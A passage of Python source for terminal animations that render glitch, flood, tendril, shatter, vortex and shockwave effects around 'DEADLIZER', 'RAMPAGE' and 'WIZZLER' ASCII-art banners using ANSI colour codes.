            for c_idx in range(cols):
                if random.random() < 0.35:
                    r2 = random.choice([255, 180, 0])
                    g2 = random.choice([0, 5, 10])
                    b2 = random.choice([0, 10, 20])
                    line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice(GLITCH_CHARS)}"
                else:
                    line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.025)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 2 — SYMBIOTE FLOOD  (30 frames, richer surface detail)
    # ══════════════════════════════════════════════════════════════════════════
    pool = [float(rows)] * cols
    flood_chars = "▓█▒░╬╠╣╦╩≈≋"
    for frame in range(30):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 29
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                flood_level = pool[c_idx]
                wave_surface = flood_level + int(3 * math.sin(c_idx * 0.22 + frame * 0.45)) + int(1.5 * math.sin(c_idx * 0.07 - frame * 0.3 + 2.0))
                if r_idx >= wave_surface:
                    depth = (r_idx - wave_surface) / max(rows - wave_surface, 1)
                    r, g, b = blood_color(0.55 + depth * 0.45, flicker=0.12)
                    # Occasional toxic swirl in the flood
                    if random.random() < 0.04:
                        r, g, b = toxic_vein(0.4 + depth * 0.4, phase=c_idx * 0.05 + frame * 0.1)
                    line_out += f"\033[38;2;{r};{g};{b}m{random.choice(flood_chars)}"
                elif r_idx == wave_surface - 1 and random.random() < 0.6:
                    r, g, b = white_hot(0.7 + 0.3 * math.sin(frame * 0.4 + c_idx * 0.1))
                    line_out += f"\033[38;2;{r};{g};{b}m{random.choice('▒░~≈')}"
                else:
                    if random.random() < 0.018:
                        r, g, b = blood_color(0.3)
                        line_out += f"\033[38;2;{r};{g};{b}m{random.choice(VEIN_CHARS)}"
                    else:
                        line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        for c_idx in range(cols):
            if random.random() < 0.6 + t * 0.35:
                pool[c_idx] = max(0, pool[c_idx] - random.uniform(0.5, 1.2))
        sys.stdout.flush()
        time.sleep(0.014)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 3a — DEADLIZER EMERGENCE PREP  (28 frames, flood + crown tentacles)
    # ══════════════════════════════════════════════════════════════════════════
    d_banner = [line.center(cols) for line in DEADLIZER_ASCII]
    banner_start_row = rows // 2 - len(d_banner) // 2

    crown = []
    for i in range(50):
        angle = (i / 50) * math.pi * 2
        bx = cols // 2 + math.cos(angle) * cols * 0.46
        by = rows // 2 + math.sin(angle) * rows * 0.40
        crown.append({
            'x': bx, 'y': by,
            'angle': angle + math.pi / 2,
            'wave_amp': random.uniform(0.9, 2.2),
            'wave_freq': random.uniform(0.12, 0.38),
            'wave_phase': angle,
            'history': [(int(bx), int(by))],
            'max_hist': random.randint(12, 24),
            'age': 0,
            'orbit_speed': random.uniform(0.009, 0.022) * random.choice([-1, 1]),
            'toxic': random.random() < 0.25,
        })

    for frame in range(28):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 54
        grid  = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0, 0, 0)] * cols for _ in range(rows)]

        # Continue tentacle motion above flood
        for tent in tentacles:
            tent['age'] += 1
            perp_angle = tent['angle'] + math.pi / 2
            wave_offset = tent['wave_amp'] * math.sin(tent['age'] * tent['wave_freq'] + tent['wave_phase'])
            tent['angle'] += random.uniform(-0.12, 0.12)
            tent['x'] = (tent['x'] + math.cos(tent['angle']) * tent['speed'] * 0.5 + math.cos(perp_angle) * wave_offset) % cols
            tent['y'] = (tent['y'] + math.sin(tent['angle']) * tent['speed'] * 0.25 + math.sin(perp_angle) * wave_offset * 0.4) % rows
            px, py = int(tent['x']), int(tent['y'])
            if 0 <= px < cols and 0 <= py < rows:
                tent['history'].append((px, py))
            if len(tent['history']) > tent['max_hist']:
                tent['history'].pop(0)
            for h_idx, (hx, hy) in enumerate(tent['history']):
                if not (0 <= hx < cols and 0 <= hy < rows): continue
                seg_t = h_idx / max(len(tent['history'])-1, 1)
                r, g, b = blood_color(seg_t * 0.75, flicker=0.12)
                grid[hy][hx] = random.choice(VEIN_CHARS)
                cgrid[hy][hx] = (r, g, b)

        # Flood rendering with richer surface
        for r_idx in range(rows):
            for c_idx in range(cols):
                flood_level = pool[c_idx]
                wave_surface = flood_level + 2.8 * math.sin(c_idx * 0.22 + frame * 0.35) + 1.4 * math.sin(c_idx * 0.07 - frame * 0.2 + 1.5)
                if r_idx >= wave_surface:
                    depth = (r_idx - wave_surface) / max(rows - wave_surface, 1)
                    r, g, b = blood_color(0.55 + depth * 0.45, flicker=0.09)
                    if random.random() < 0.03:
                        r, g, b = toxic_vein(0.3 + depth * 0.5, phase=c_idx * 0.04 + frame * 0.08)
                    grid[r_idx][c_idx] = random.choice(flood_chars)
                    cgrid[r_idx][c_idx] = (r, g, b)
                elif r_idx >= wave_surface - 1.5 and random.random() < 0.65:
                    r, g, b = white_hot(0.65 + 0.35 * math.sin(frame * 0.4 + c_idx * 0.08))
                    grid[r_idx][c_idx] = random.choice("▒░~≈")
                    cgrid[r_idx][c_idx] = (r, g, b)

        for c_idx in range(cols):
            if random.random() < 0.65 + t * 0.3:
                pool[c_idx] = max(0.0, pool[c_idx] - random.uniform(0.3, 0.9))

        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                r, g, b = cgrid[r_idx][c_idx]
                line_out += f"\033[38;2;{r};{g};{b}m{ch}" if ch != " " else " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.012)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 3b — SYMBIOTE TAKEOVER OF DEADLIZER BANNER
    # Red tendrils crawl from all edges ONTO the banner, consuming each char.
    # Each letter gets wrapped/eaten by a tendril before locking crimson.
    # ══════════════════════════════════════════════════════════════════════════
    d_banner = [line.center(cols) for line in DEADLIZER_ASCII]
    banner_start_row = rows // 2 - len(d_banner) // 2

    # Build flat list of all banner char positions
    banner_chars = []
    for li, line in enumerate(d_banner):
        for ci, ch in enumerate(line):
            if ch != " ":
                banner_chars.append((li, ci, ch))

    total_chars = len(banner_chars)
    char_consume_frame = {}
    for idx, (li, ci, ch) in enumerate(banner_chars):
        char_consume_frame[(li, ci)] = int((idx / max(total_chars - 1, 1)) * 38)

    # Takeover tendrils — one pair per banner row, crawling inward from left+right
    takeover_tendrils = []
    for li in range(len(d_banner)):
        row_y = banner_start_row + li
        takeover_tendrils.append({
            'x': 0.0, 'y': float(row_y),
            'target_row': li, 'direction': 1,
            'history': [], 'age': li * 2,
            'color_phase': random.uniform(0, math.pi * 2),
            'pulse_offset': random.uniform(0, math.pi * 2),
        })
        takeover_tendrils.append({
            'x': float(cols - 1), 'y': float(row_y),
            'target_row': li, 'direction': -1,
            'history': [], 'age': li * 2 + 1,
            'color_phase': random.uniform(0, math.pi * 2),
            'pulse_offset': random.uniform(0, math.pi * 2),
        })

    consumed = set()

    TAKEOVER_FRAMES = 55
    for frame in range(TAKEOVER_FRAMES):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / (TAKEOVER_FRAMES - 1)
        grid  = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0, 0, 0)] * cols for _ in range(rows)]

        for r_idx in range(rows):
            for c_idx in range(cols):
                if random.random() < 0.006:
                    r2, g2, b2 = blood_color(0.2, flicker=0.2)
                    grid[r_idx][c_idx] = random.choice("░·,")
                    cgrid[r_idx][c_idx] = (r2, g2, b2)

        for tt in takeover_tendrils:
            if frame < tt['age']: continue
            local_frame = frame - tt['age']
            tt['x'] += tt['direction'] * random.uniform(1.8, 3.2)
            tt['x'] = max(0.0, min(cols - 1.0, tt['x']))
            tt['y'] = (banner_start_row + tt['target_row']
                       + 0.6 * math.sin(local_frame * 0.4 + tt['color_phase']))
            px, py = int(tt['x']), int(tt['y'])
            if 0 <= px < cols and 0 <= py < rows:
                tt['history'].append((px, py))
            if len(tt['history']) > 18:
                tt['history'].pop(0)
            for hx, hy in tt['history']:
                li = hy - banner_start_row
                if 0 <= li < len(d_banner):
                    for ci in range(max(0, hx - 2), min(len(d_banner[li]), hx + 3)):
                        if d_banner[li][ci] != " ":
                            consumed.add((li, ci))
            hist_len = len(tt['history'])
            for h_idx, (hx, hy) in enumerate(tt['history']):
                if not (0 <= hx < cols and 0 <= hy < rows): continue
                seg_t = h_idx / max(hist_len - 1, 1)
                body_pulse = 0.7 + 0.3 * math.sin(frame * 0.6 + tt['pulse_offset'] + seg_t * math.pi)
                if h_idx == hist_len - 1:
                    crack = math.sin(frame * 2.0 + tt['color_phase']) * 0.5 + 0.5
                    r2, g2, b2 = 255, min(255, int(160 * crack + 50)), min(255, int(40 * crack))
                    ch = random.choice("✦★◉•@#*")
                elif seg_t > 0.6:
                    r2 = min(255, int(255 * body_pulse))
                    g2 = min(255, int(30 * body_pulse))
                    b2 = min(255, int(15 * body_pulse))
                    ch = random.choice("▓█╬╠╣")
                else:
                    r2, g2, b2 = blood_color(seg_t * body_pulse, flicker=0.12)
                    ch = random.choice(VEIN_CHARS)
                for dx2 in range(-1, 2):
                    nx2 = hx + dx2
                    if 0 <= nx2 < cols:
                        grid[hy][nx2] = ch
                        cgrid[hy][nx2] = (r2, g2, b2)

        for r_idx in range(rows):
            line_idx = r_idx - banner_start_row
            if 0 <= line_idx < len(d_banner):
                line = d_banner[line_idx]
                out = ""
                for c_idx, char in enumerate(line):
                    if char == " ":
                        ch2 = grid[r_idx][c_idx]
                        if ch2 != " ":
                            cr, cg, cb = cgrid[r_idx][c_idx]
                            out += f"\033[38;2;{cr};{cg};{cb}m{ch2}"
                        else:
                            out += " "
                        continue
                    key = (line_idx, c_idx)
                    if key in consumed:
                        pulse = 0.78 + 0.22 * math.sin(frame * 0.55 + c_idx * 0.07 + line_idx * 0.1)
                        r2 = min(255, int(255 * pulse))
                        g2 = min(255, int(12 * pulse))
                        b2 = min(255, int(18 * pulse))
                        consume_age = frame - char_consume_frame.get(key, 0)
                        if consume_age < 4 and random.random() < 0.3:
                            r2, g2, b2 = 255, 200, 150
                        out += f"\033[1m\033[38;2;{r2};{g2};{b2}m{char}"
                    else:
                        if random.random() < 0.25:
                            r2, g2, b2 = blood_color(0.3, flicker=0.4)
                            out += f"\033[38;2;{r2};{g2};{b2}m{random.choice(GLITCH_CHARS)}"
                        elif random.random() < 0.15:
                            out += f"\033[38;2;0;40;20m{char}"
                        else:
                            out += " "
                sys.stdout.write(out + "\033[0m\n")
            else:
                line_out = ""
                for c_idx in range(cols):
                    ch2 = grid[r_idx][c_idx]
                    if ch2 != " ":
                        cr, cg, cb = cgrid[r_idx][c_idx]
                        line_out += f"\033[38;2;{cr};{cg};{cb}m{ch2}"
                    else:
                        line_out += " "
                sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.012)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 4 — SYMBIOTE HEARTBEAT LOCK  (22 frames)
    # ══════════════════════════════════════════════════════════════════════════
    for li, ci, ch in banner_chars:
        consumed.add((li, ci))

    for frame in range(22):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        beat_t = (frame % 9) / 8
        heartbeat = (math.exp(-((beat_t - 0.12) ** 2) / 0.007) * 0.8
                     + math.exp(-((beat_t - 0.32) ** 2) / 0.005) * 0.55)
        bg_intensity = 0.04 + heartbeat * 0.20
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                line_idx = r_idx - banner_start_row
                if 0 <= line_idx < len(d_banner) and c_idx < len(d_banner[line_idx]):
                    char = d_banner[line_idx][c_idx]
                    if char != " ":
                        pulse = 0.68 + 0.32 * heartbeat
                        r2 = min(255, int(255 * pulse))
                        g2 = min(255, int(12 * pulse))
                        b2 = min(255, int(18 * pulse))
                        if heartbeat > 0.55 and random.random() < 0.08:
                            r2, g2, b2 = 255, min(255, int(120 * heartbeat)), 0
                            char = random.choice("╬╠╣▓█")
                        line_out += f"\033[1m\033[38;2;{r2};{g2};{b2}m{char}"
                        continue
                if random.random() < bg_intensity:
                    r2, g2, b2 = blood_color(bg_intensity * 2.5, flicker=0.4)
                    line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice('░▒·╬')}"
                else:
                    line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.018)

    # ══════════════════════════════════════════════════════════════════════════
    # FINALE — "CARNAGE" TITLE CARD  (per-char crimson glow reveal)
    # ══════════════════════════════════════════════════════════════════════════
    RAMPAGE_TITLE = [
        " ██████╗  █████╗ ███╗   ███╗██████╗  █████╗  ██████╗ ███████╗",
        " ██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔══██╗██╔════╝ ██╔════╝",
        " ██████╔╝███████║██╔████╔██║██████╔╝███████║██║  ███╗█████╗  ",
        " ██╔══██╗██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  ",
        " ██║  ██║██║  ██║██║ ╚═╝ ██║██║     ██║  ██║╚██████╔╝███████╗",
        " ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝",
    ]
    title_top = rows // 2 - len(RAMPAGE_TITLE) // 2
    for frame in range(22):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 21
        for r_idx in range(rows):
            line_idx = r_idx - title_top
            if 0 <= line_idx < len(RAMPAGE_TITLE):
                line = RAMPAGE_TITLE[line_idx]
                pad = max((cols - len(line)) // 2, 0)
                out = " " * pad
                for c_idx, char in enumerate(line):
                    if char != " ":
                        reveal = max(0.0, min(1.0, t * 1.6 - (c_idx / max(len(line), 1)) * 0.5))
                        if random.random() < reveal:
                            pulse = 0.75 + 0.25 * math.sin(frame * 0.6 + c_idx * 0.08)
                            r2 = min(255, int(255 * pulse))
                            g2 = min(255, int(12 * pulse + 8 * reveal))
                            b2 = min(255, int(18 * pulse))
                            if random.random() < 0.04:
                                r2, g2, b2 = 255, 220, 180
                            out += f"\033[1m\033[38;2;{r2};{g2};{b2}m{char}"
                        else:
                            r2, g2, b2 = blood_color(0.35, flicker=0.4)
                            out += f"\033[38;2;{r2};{g2};{b2}m{random.choice(GLITCH_CHARS)}"
                    else:
                        out += " "
                sys.stdout.write(out + "\033[0m\n")
            else:
                line_out = ""
                for c_idx in range(cols):
                    if random.random() < 0.008:
                        r2, g2, b2 = blood_color(0.2, flicker=0.2)
                        line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice('░·')}"
                    else:
                        line_out += " "
                sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.04)

    if not skipper.should_skip:
        time.sleep(0.6)

    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _cyberpunk_effect():
    """SINGULARITY REBOOT: Deadlizer dissolves into the void — ultra-dark neon Wizzler materialization."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 107, 30

    def neon_color(t, hue_shift=0.0):
        h = (t * 360 + hue_shift) % 360
        s, v = 0.9, 1.0
        c = v * s
        x = c * (1 - abs((h / 60) % 2 - 1))
        m = v - c
        if h < 60:   r2, g2, b2 = c, x, 0
        elif h < 120: r2, g2, b2 = x, c, 0
        elif h < 180: r2, g2, b2 = 0, c, x
        elif h < 240: r2, g2, b2 = 0, x, c
        elif h < 300: r2, g2, b2 = x, 0, c
        else:         r2, g2, b2 = c, 0, x
        return int((r2+m)*255), int((g2+m)*255), int((b2+m)*255)

    def wizzler_color(t, frame=0):
        r2 = int(WIZZLER_START[0] * (1-t) + WIZZLER_END[0] * t)
        g2 = int(WIZZLER_START[1] * (1-t) + WIZZLER_END[1] * t)
        b2 = int(WIZZLER_START[2] * (1-t) + WIZZLER_END[2] * t)
        pulse = 0.82 + 0.18 * math.sin(frame * 0.3)
        return min(255, int(r2*pulse)), min(255, int(g2*pulse)), min(255, int(b2*pulse))

    def dark_cyber(t, phase=0.0):
        r2 = min(255, int(30 * t + 20 * abs(math.sin(phase))))
        g2 = min(255, int(80 * t + 40 * abs(math.sin(phase + 1.0))))
        b2 = min(255, int(160 * t + 60 * abs(math.sin(phase + 2.0))))
        return r2, g2, b2

    CYBER_CHARS  = "01<>[]{}+=-_/\\|!@#$%^&*"
    PLASMA_CHARS = "░▒▓█▄▀■□▪▫◆◇○●"
    SPARK_CHARS  = "+*·:°•◦✦✧"
    WAVE_CHARS   = "~≈≋∿⌇⌁"
    GLITCH_CHARS = "!@#$%^&*<>?|\\/{}"
    MATRIX_CHARS = "ｦｧｨｩｪｫｬｭｮｯｰｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ0123456789"

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 0 — DEADLIZER STATIC CORRUPTION  (25 frames)
    # ══════════════════════════════════════════════════════════════════════════
    d_banner = [line.center(cols) for line in DEADLIZER_ASCII]
    banner_top_d = rows // 2 - len(d_banner) // 2

    for frame in range(25):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 24
        for r_idx in range(rows):
            line_out = ""
            line_idx = r_idx - banner_top_d
            line = d_banner[line_idx] if 0 <= line_idx < len(d_banner) else " " * cols
            for c_idx, char in enumerate(line):
                noise = math.sin(c_idx * 0.31 + r_idx * 0.58 + frame * 1.2) * 0.5 + 0.5
                if char != " ":
                    if random.random() < t * 0.85 * noise:
                        r2, g2, b2 = neon_color(random.uniform(0.5, 0.9), hue_shift=random.uniform(200, 320))
                        r2, g2, b2 = int(r2*0.4), int(g2*0.4), int(b2*0.4)
                        line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice(GLITCH_CHARS)}"
                    else:
                        fade = max(0, int(255 * (1.0 - t * 0.9)))
                        line_out += f"\033[38;2;{fade};{int(fade*0.08)};{int(fade*0.11)}m{char}"
                else:
                    if random.random() < t * 0.05:
                        r2, g2, b2 = dark_cyber(t * 0.4, phase=c_idx * 0.04 + frame * 0.1)
                        line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice(CYBER_CHARS)}"
                    else:
                        line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.014)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 1 — DEADLIZER SHATTER  (35 frames)
    # ══════════════════════════════════════════════════════════════════════════
    shards = []
    for r_idx, line in enumerate(d_banner):
        for c_idx, ch in enumerate(line):
            if ch.strip():
                shards.append({
                    'x': float(c_idx), 'y': float(r_idx + banner_top_d),
                    'char': ch,
                    'vx': random.uniform(-4.5, 4.5),
                    'vy': random.uniform(-2.5, 2.5),
                    'life': 1.0,
                    'decay': random.uniform(0.03, 0.09),
                    'spin': random.choice(GLITCH_CHARS),
                })

    afterburn = []
    for _ in range(120):
        afterburn.append({
            'x': float(cols // 2 + random.uniform(-cols*0.3, cols*0.3)),
            'y': float(rows // 2 + random.uniform(-rows*0.3, rows*0.3)),
            'vx': random.uniform(-1.5, 1.5),
            'vy': random.uniform(-0.8, 0.8),
            'life': random.uniform(0.4, 1.0),
            'decay': random.uniform(0.02, 0.06),
            'char': random.choice(SPARK_CHARS),
        })

    for frame in range(35):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid  = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0, 0, 0)] * cols for _ in range(rows)]
        for shard in shards:
            shard['x'] += shard['vx']
            shard['y'] += shard['vy']
            shard['vy'] += 0.07
            shard['life'] -= shard['decay']
            if shard['life'] <= 0: continue
            px, py = int(shard['x']), int(shard['y'])
            if 0 <= px < cols and 0 <= py < rows:
                r2 = min(255, int(255 * shard['life']))
                g2 = min(255, int(18 * shard['life']))
                b2 = min(255, int(140 * shard['life']))
                grid[py][px] = shard['char'] if random.random() > 0.3 else shard['spin']
                cgrid[py][px] = (r2, g2, b2)
        for ab in afterburn:
            ab['x'] += ab['vx']
            ab['y'] += ab['vy']
            ab['life'] -= ab['decay']
            if ab['life'] <= 0: continue
            px, py = int(ab['x']), int(ab['y'])
            if 0 <= px < cols and 0 <= py < rows:
                r2, g2, b2 = neon_color(frame * 0.03 + ab['life'], hue_shift=random.uniform(180, 300))
                grid[py][px] = ab['char']
                cgrid[py][px] = (int(r2*ab['life']), int(g2*ab['life']), int(b2*ab['life']))
        for _ in range(25):
            sx, sy = random.randint(0, cols-1), random.randint(0, rows-1)
            r2, g2, b2 = dark_cyber(random.uniform(0.1, 0.4), phase=frame * 0.15)
            grid[sy][sx] = random.choice(CYBER_CHARS)
            cgrid[sy][sx] = (r2, g2, b2)
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                r2, g2, b2 = cgrid[r_idx][c_idx]
                line_out += f"\033[38;2;{r2};{g2};{b2}m{ch}" if ch != " " else " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.015)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 2 — VOID COLLAPSE  (25 frames)
    # ══════════════════════════════════════════════════════════════════════════
    for frame in range(25):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 24
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                if random.random() < (1.0 - t) * 0.09:
                    r2, g2, b2 = dark_cyber(random.uniform(0.1, 0.5) * (1.0 - t), phase=c_idx * 0.04 + frame * 0.12)
                    line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice(CYBER_CHARS)}"
                elif abs(r_idx - rows//2) < rows * t * 0.4 and random.random() < 0.06 * t:
                    r2, g2, b2 = neon_color(t * 0.3, hue_shift=c_idx * 2 + frame * 5)
                    line_out += f"\033[38;2;{int(r2*0.2)};{int(g2*0.2)};{int(b2*0.2)}m{random.choice('░▒')}"
                else:
                    line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.013)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 3 — PLASMA WAVE STORM  (40 frames)
    # ══════════════════════════════════════════════════════════════════════════
    for frame in range(40):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                w1 = math.sin(c_idx * 0.08 + frame * 0.26 + r_idx * 0.05)
                w2 = math.sin(c_idx * 0.13 - frame * 0.19 + r_idx * 0.09 + 1.2)
                w3 = math.sin(c_idx * 0.05 + frame * 0.33 - r_idx * 0.07 + 2.4)
                w4 = math.sin(c_idx * 0.11 - frame * 0.15 - r_idx * 0.12 + 3.8)
                combined = (w1 + w2 + w3 + w4) / 4
                if combined > 0.5:
                    intensity = (combined - 0.5) / 0.5
                    r2, g2, b2 = neon_color(frame * 0.04 + c_idx * 0.005, hue_shift=r_idx * 2.5 + 200)
                    line_out += f"\033[38;2;{min(255,int(r2*intensity))};{min(255,int(g2*intensity))};{min(255,int(b2*intensity))}m{random.choice(PLASMA_CHARS)}"
                elif combined > 0.15:
                    r2, g2, b2 = dark_cyber((combined - 0.15) / 0.35, phase=c_idx * 0.03 + frame * 0.08)
                    line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice(WAVE_CHARS)}"
                else:
                    line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.014)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 4 — VORTEX CONVERGENCE  (50 frames)
    # ══════════════════════════════════════════════════════════════════════════
    cx, cy = cols / 2, rows / 2
    vortex_particles = []
    for i in range(350):
        angle = random.uniform(0, math.pi * 2)
        radius = random.uniform(5, max(cols, rows) * 0.65)
        vortex_particles.append({
            'angle': angle,
            'radius': radius,
            'speed': random.uniform(0.06, 0.25),
            'spiral': random.uniform(0.012, 0.038),
            'char': random.choice(CYBER_CHARS + PLASMA_CHARS),
            'hue': random.uniform(0.55, 0.85),
        })

    for frame in range(50):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid  = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0, 0, 0)] * cols for _ in range(rows)]
        for vp in vortex_particles:
            vp['angle'] += vp['speed']
            vp['radius'] = max(0, vp['radius'] - vp['spiral'] * (frame + 1) * 0.45)
            px = int(cx + math.cos(vp['angle']) * vp['radius'])
            py = int(cy + math.sin(vp['angle']) * vp['radius'] * 0.45)
            if 0 <= px < cols and 0 <= py < rows:
                t_val = 1.0 - vp['radius'] / (max(cols, rows) * 0.65)
                r2, g2, b2 = neon_color(vp['hue'] + frame * 0.015, hue_shift=t_val * 100 + 200)
                dim = 0.3 + t_val * 0.7
                grid[py][px] = vp['char']
                cgrid[py][px] = (int(r2*dim), int(g2*dim), int(b2*dim))
        core_size = min(frame // 5 + 1, 5)
        for dr in range(-core_size, core_size+1):
            for dc in range(-core_size*2, core_size*2+1):
                gy, gx = int(cy)+dr, int(cx)+dc
                if 0 <= gx < cols and 0 <= gy < rows:
                    core_t = 1.0 - (abs(dr)/max(core_size,1) + abs(dc)/max(core_size*2,1)) / 2
                    r2, g2, b2 = wizzler_color(core_t, frame)
                    grid[gy][gx] = random.choice("█▓◆●■")
                    cgrid[gy][gx] = (r2, g2, b2)
        for _ in range(15):
            sx, sy = random.randint(0, cols-1), random.randint(0, rows-1)
            r2, g2, b2 = dark_cyber(0.15, phase=frame * 0.1)
            grid[sy][sx] = random.choice(MATRIX_CHARS)
            cgrid[sy][sx] = (r2, g2, b2)
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                r2, g2, b2 = cgrid[r_idx][c_idx]
                line_out += f"\033[38;2;{r2};{g2};{b2}m{ch}" if ch != " " else " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.014)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 5 — SHOCKWAVE EXPANSION  (40 frames)
    # ══════════════════════════════════════════════════════════════════════════
    w_banner = [line.center(cols) for line in WIZZLER_ASCII]
    banner_start = rows // 2 - len(w_banner) // 2

    for frame in range(40):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 39
        shock_radius = t * max(cols, rows) * 0.78
        ring_width = 5 + frame * 0.35
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                dist = math.sqrt((c_idx - cx)**2 + ((r_idx - cy) * 2.2)**2)
                in_ring = abs(dist - shock_radius) < ring_width
                inside  = dist < shock_radius
                line_idx = r_idx - banner_start
                is_banner = (0 <= line_idx < len(w_banner) and
                             c_idx < len(w_banner[line_idx]) and
                             w_banner[line_idx][c_idx] != " ")
                if in_ring:
                    ring_t = 1.0 - abs(dist - shock_radius) / ring_width
                    r2, g2, b2 = neon_color(frame * 0.05, hue_shift=c_idx * 1.8 + 200)
                    r2 = min(255, int(r2 * ring_t + 180 * ring_t))
                    g2 = min(255, int(g2 * ring_t + 180 * ring_t))
                    b2 = min(255, int(b2 * ring_t + 180 * ring_t))
                    line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice('█▓▒░')}"
                elif inside and is_banner:
                    h_blend = c_idx / max(cols-1, 1)
                    r2 = int(WIZZLER_START[0]*(1-h_blend) + WIZZLER_END[0]*h_blend)
                    g2 = int(WIZZLER_START[1]*(1-h_blend) + WIZZLER_END[1]*h_blend)
                    b2 = int(WIZZLER_START[2]*(1-h_blend) + WIZZLER_END[2]*h_blend)
                    pulse = 0.78 + 0.22 * math.sin(frame * 0.4 + c_idx * 0.05)
                    line_out += f"\033[1m\033[38;2;{min(255,int(r2*pulse))};{min(255,int(g2*pulse))};{min(255,int(b2*pulse))}m{w_banner[line_idx][c_idx]}"
                elif inside:
                    w1 = math.sin(c_idx * 0.1 + r_idx * 0.08 + frame * 0.22)
                    if w1 > 0.55 and random.random() < 0.28:
                        r2, g2, b2 = neon_color(frame * 0.04 + c_idx * 0.003, hue_shift=220)
                        line_out += f"\033[38;2;{int(r2*0.5)};{int(g2*0.5)};{int(b2*0.5)}m{random.choice(PLASMA_CHARS)}"
                    else:
                        line_out += " "
                else:
                    if random.random() < 0.012 * (1 - t):
                        r2, g2, b2 = dark_cyber(0.2, phase=c_idx * 0.03 + frame * 0.08)
                        line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice(CYBER_CHARS)}"
                    else:
                        line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.015)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 6 — MATRIX RAIN OVERLAY  (30 frames)
    # ══════════════════════════════════════════════════════════════════════════
    drops = [{'y': random.uniform(-rows, 0), 'speed': random.uniform(0.4, 1.5),
               'trail': random.randint(4, 14)} for _ in range(cols)]

    for frame in range(30):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        fade_out = max(0.0, 1.0 - frame / 29)
        for r_idx in range(rows):
            line_out = ""
            for c_idx in range(cols):
                line_idx = r_idx - banner_start
                if 0 <= line_idx < len(w_banner) and c_idx < len(w_banner[line_idx]):
                    char = w_banner[line_idx][c_idx]
                    if char != " ":
                        h_blend = c_idx / max(cols-1, 1)
                        r2 = int(WIZZLER_START[0]*(1-h_blend) + WIZZLER_END[0]*h_blend)
                        g2 = int(WIZZLER_START[1]*(1-h_blend) + WIZZLER_END[1]*h_blend)
                        b2 = int(WIZZLER_START[2]*(1-h_blend) + WIZZLER_END[2]*h_blend)
